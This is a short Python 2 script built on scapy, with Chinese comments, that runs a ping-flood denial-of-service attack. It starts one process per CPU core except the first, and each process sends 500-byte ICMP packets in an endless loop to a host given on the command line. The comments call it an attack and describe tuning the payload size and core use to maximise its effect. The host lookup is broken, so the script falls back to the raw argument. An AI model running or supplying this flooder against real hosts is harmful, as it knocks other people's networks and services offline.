import time
import sys
import multiprocessing
from scapy.all import *


def preset(cpu_number): #该方法负责启动多处理进程。
	processes = [multiprocessing.Process(target=start_attack, args=()) for i in range(cpu_number)]

	for i in range(cpu_number):
		processes[i].start()
	for i in range(cpu_number):
		processes[i].join()

def start_attack():
	ip_adress = ""
	data = "X"*500 #更改500以调整ICMP数据字段中的字节值.建议更改此值，以便将大数据发送到最大1440字节。
	if len(sys.argv) < 2:
		print "Please give an ip adress or domain name"
	else:
		try:
			#packet = sr1(IP(dst="195.175.39.49")/UDP()/DNS(rd=1, qd=DNSQR(qname=sys.argv[1])), verbose=False)
			packet = sr1(IP(dst="192.168.133.1"), verbose=False)
			ip_adress = packet[1][DNSRR].rdata
		except:
			ip_adress = sys.argv[1]
		
		send(IP(dst=ip_adress)/ICMP()/data, verbose=False, loop=1)

def main():
	t = round(time.time())

	preset(multiprocessing.cpu_count()-1) #该工具将使用您的cpu的所有内核[除第一个内核外]，以最大限度地发挥此次攻击的效果。

	print "Attack finished with: %s seconds" % (round(time.time() - t))
	sys.exit()


if __name__ == '__main__':
	try:
		t = round(time.time())
		main()
	except:
		print "Attack finished with: %s seconds" % (round(time.time() - t))
		sys.exit()
